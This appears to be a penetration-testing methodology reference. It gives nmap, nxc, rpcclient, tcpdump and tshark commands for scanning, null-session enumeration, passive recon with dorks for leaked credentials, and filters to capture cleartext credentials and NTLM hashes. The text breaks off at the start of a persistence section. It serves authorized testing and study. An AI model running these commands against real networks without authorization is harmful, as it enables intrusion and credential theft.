sudo tcpdump -i tun0 -w capture.pcap
sudo tcpdump -i eth0 'port 445 or port 389' -w smb_ldap.pcap

See Traffic Capture for Wireshark filters and protocol-specific capture techniques.

docs.title: 5. Unauthenticated Network Enumeration
docs.text:
Once you have network access, enumerate users and hosts through null sessions and anonymous binds before attempting any authentication.

nxc smb 10.10.10.0/24 --gen-relay-list alive.txt    # find SMB hosts
nxc smb 10.10.10.10 -u '' -p '' --users             # null session user enum
rpcclient -U "" -N 10.10.10.10                      # anonymous RPC

Protocol-specific enumeration (SMB, LDAP, Kerberos, SMTP, SNMP, etc.) lives in the Services section — each port has its own page with the relevant commands.

docs.title: 6. Web Screenshot Sweep
docs.text:
After identifying HTTP/HTTPS services, use EyeWitness to screenshot all of them at once — saves time over opening each manually.

eyewitness -x nmap_services.xml -d output

See EyeWitness for usage with target file lists and RDP/VNC capture.

docs.title: Network Scanning
docs.text: Two-phase approach: quick scan first to identify open ports, then launch a full scan in the background while you start enumeration. Don't wait for -p- to finish — by the time it completes you should already have a foothold on whatever the quick scan surfaced.

docs.title: Host Discovery (Local Segment)
docs.text:
On an internal engagement where you have L2 access to the target subnet, ARP is faster and more reliable than ICMP sweeps — every live host on the segment must answer ARP.

sudo arp-scan -l                        # auto-detect interface and subnet
sudo arp-scan 192.168.1.0/24
sudo netdiscover -r 192.168.1.0/24

For remote subnets, fall back to nmap ping sweeps:

nmap -sn -PE -PA21,23,80,3389 10.10.10.0/24

docs.title: Phase 1: Quick Scan
docs.text:
Hit the top 1000 ports and identify services fast. Run this first, then start enumerating immediately.

nmap -sV --open -T4 10.10.10.10

RustScan is faster for port discovery — it finds open ports in seconds, then hands off to nmap for service detection:

rustscan -a 10.10.10.10 --ulimit 5000 -- -sV

docs.title: Phase 2: Full Port Scan
docs.text:
Run in the background while you work on what Phase 1 found. Catches anything above port 1000.

nmap -p- -T4 --open -oN nmap_full.txt 10.10.10.10

docs.title: Service & Script Scan
docs.text:
Once you have a port list, run a targeted service scan with default scripts:

nmap -sC -sV -p 22,80,443 10.10.10.10 -oN nmap_services.txt

docs.title: UDP (Targeted)
docs.text:
UDP is slow — only scan for specific services you suspect. Common targets: DNS (53), SNMP (161), NFS (111), IKE (500/4500).

sudo nmap -sU -p 53,111,161,500,4500 10.10.10.10

docs.title: SMB Vulnerability Scan
docs.text:
nmap -p 445,139 --script smb-vuln* --script-args=unsafe=1 10.10.10.10

Watch out

--script=vuln and smb-vuln* with unsafe=1 can crash vulnerable services. Fine for HTB — be cautious on real engagements.

docs.title: Reconnaissance
docs.text:
Tip

Start passive before going active — WHOIS, certificate transparency, and search engines leave no trace on the target. Move to active DNS brute-forcing and port probing only after passive sources are exhausted.

docs.title: WHOIS
docs.text:
whois example.com
whois 10.10.10.10

docs.title: DNS Lookups
docs.text:
Use dig — nslookup is dated and harder to parse.

dig example.com ANY +noall +answer
dig example.com MX +short
dig example.com NS +short
dig -x 10.10.10.10 +short              # reverse lookup
dig @<dc-ip> example.com AXFR           # zone transfer

dnsrecon automates the same checks and attempts AXFR across every nameserver:

dnsrecon -d example.com
dnsrecon -d example.com -t axfr

docs.title: Certificate Transparency (crt.sh)
docs.text:
CT logs are the single best passive source for subdomains — every public cert issued is logged.

curl -s 'https://crt.sh/?q=%25.example.com&output=json' \
  | jq -r '.[].name_value' | sort -u

docs.title: Subdomain Enumeration (Passive)
docs.text:
subfinder -d example.com -silent
amass enum -passive -d example.com
assetfinder --subs-only example.com
theHarvester -d example.com -b all

Pipe results into httpx to probe which subdomains are live:

subfinder -d example.com -silent | httpx -silent -status-code -title

docs.title: Historical URLs (Wayback Machine)
docs.text:
Archived paths often reveal old admin panels, backup files, and forgotten endpoints.

waybackurls example.com | tee wayback.txt
gau example.com | tee gau.txt

docs.title: GitHub / Code Search
docs.text:
Leaked credentials, API keys, and internal hostnames frequently end up in public repos.

# Manual GitHub dorks
"example.com" password
"example.com" api_key
org:example filename:.env

# Automated
trufflehog github --org=example
gitleaks detect --source . --verbose

docs.title: Google Dorking
docs.text:
site:example.com filetype:pdf
site:example.com ext:xml
site:example.com intitle:"index of"
site:example.com inurl:admin

docs.title: Shodan
docs.text:
shodan search "Apache country:US org:\"Example Corp\""
shodan host 10.10.10.10

docs.title: Netcraft Site Report
docs.text:
Netcraft's site report returns hosting, nameservers, and tech stack for a given domain. Use the URL directly — there's no grep-from-homepage shortcut.

https://sitereport.netcraft.com/?url=example.com

docs.title: DNS Brute-Forcing
docs.text:
dnsrecon -d example.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

docs.title: Virtual Host Brute-Forcing
docs.text:
When a webserver hosts multiple vhosts on the same IP, brute-force the Host header:

ffuf -u http://10.10.10.10 -H "Host: FUZZ.example.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <size-to-filter>

-fs filters out the baseline response size so only hits that return different content are shown.

docs.title: Host Discovery
docs.text:
Sweep a range for live hosts before full port scans:

nmap -sn -PE -PA21,23,80,3389 10.10.10.0/24

For local-segment work, ARP is faster and more reliable than ICMP:

sudo arp-scan -l
sudo netdiscover -r 192.168.1.0/24

See Network Scanning for port scanning and service detection.

docs.title: Banner Grabbing
docs.text:
Quick version checks without full -sV:

nc -nv 10.10.10.10 80
curl -I http://10.10.10.10
curl -sI https://10.10.10.10 -k | grep -iE 'server|x-powered-by'

docs.title: Scanning Through a Proxy
docs.text:
When direct scanning is blocked or you're pivoting through a SOCKS proxy:

proxychains nmap -sT -Pn -p 80,443 10.10.10.10

TCP connect (-sT) is required — proxychains can't tunnel raw SYN packets. See Tunneling.

docs.title: Next Steps
docs.text:
Once you have live hosts and open ports, move to protocol-specific enumeration in the Services section — SMB, SMTP, SNMP, LDAP, and everything else is covered there with per-port commands.

Real-world

On external engagements, CT logs + subfinder + httpx will surface 80% of the attack surface in the first ten minutes. Wayback and GitHub dorking frequently hand over credentials or forgotten staging subdomains that bypass every WAF the client pays for.

docs.title: Traffic Capture
docs.text:
Tip

Always specify an interface explicitly (-i tun0 or -i eth0) — defaulting to any on a busy network produces unmanageable output. Use -w capture.pcap to write to disk and analyze offline with Wireshark or tshark.

docs.title: Quick Interface Triage
docs.text:
When you're not sure which interface has traffic, watch all of them briefly with MAC addresses visible:

sudo tcpdump -i any -nn -e -c 50

-nn skips DNS/port name resolution, -e prints link-layer headers (useful for spotting unexpected MAC sources on a segment).

docs.title: Basic Capture on a Specific Interface and Port
docs.text:
sudo tcpdump -i tun0 port 80

Common options:

  • -w capture.pcap — Save output to a file for later analysis
  • -v — Verbose output
  • -vv — More verbose output, including ASCII data
  • icmp — Filter ICMP packets only
  • -n — Do not resolve IP addresses to hostnames

docs.title: Capturing GET Requests
docs.text: sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

docs.title: Filtering by TCP Flags
docs.text: sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'

docs.title: Capture Only DNS Traffic
docs.text: sudo tcpdump -i eth0 udp port 53

docs.title: Capture HTTPS Traffic on a Specific Host
docs.text: sudo tcpdump -i eth0 port 443 and host 192.168.1.10

docs.title: Capture All SSH Traffic
docs.text: sudo tcpdump -i eth0 port 22

docs.title: Capture Packets from a Specific MAC Address
docs.text: sudo tcpdump -i eth0 ether src 00:1A:2B:3C:4D:5E

docs.title: Saving and Analyzing Captures
docs.text:
sudo tcpdump -i eth0 -w output.pcap
tcpdump -r output.pcap
tshark -r output.pcap

docs.title: tshark Display Filters
docs.text:
tshark uses the same display filter syntax as Wireshark — more expressive than tcpdump BPF filters. Read a pcap and extract only what matters:

# All HTTP requests with URI
tshark -r capture.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri

# DNS queries (names only)
tshark -r capture.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | sort -u

# Extract credentials in HTTP Basic / POST bodies
tshark -r capture.pcap -Y 'http.authorization or http.request.method == "POST"' -V

# NTLMSSP handshakes (challenge/response pairs for cracking)
tshark -r capture.pcap -Y 'ntlmssp'

# Kerberos AS-REQ / AS-REP (look for pre-auth disabled users)
tshark -r capture.pcap -Y 'kerberos.msg_type == 10 or kerberos.msg_type == 11'

Live capture with a display filter:

sudo tshark -i eth0 -Y 'http.request' -T fields -e http.host -e http.request.uri

Real-world

On internal engagements, a 5-minute tshark capture on the user VLAN often yields cleartext creds (LDAP binds, HTTP Basic, old SNMP community strings) before you've run a single nmap scan. Pair with Responder for LLMNR/NBT-NS poisoning when passive listening isn't enough.

docs.title: Persistence
docs.text:
Persistence mechanisms maintain access to a compromised system after a reboot, session timeout, or credential rotation. On real engagements, only establish persistence when explicitly in scope — and always document and remove every mechanism before the assessment closes.

Watch out

Leaving backdoors in client environments without explicit sign-off is a significant liability. Document every persistence mechanism with the host, technique, location, and timestamp. Clean up during the debrief phase.

docs.title: 1. Determine If Persistence Is Needed
docs.text:
On HTB and most CTFs, persistence isn't necessary — you have full control of the environment. On real engagements, assess whether persistence is in scope and what level is appropriate:

  • Session persistence — survive a disconnect but not a reboot (SSH key, WinRM backdoor)
  • Reboot persistence — survive a restart (cron, scheduled task, registry run key, service)
  • Domain persistence — survive credential rotation (Golden Ticket, shadow admin account)

docs.title: 2. Linux Persistence
docs.text:
Prefer techniques that blend with normal system activity:
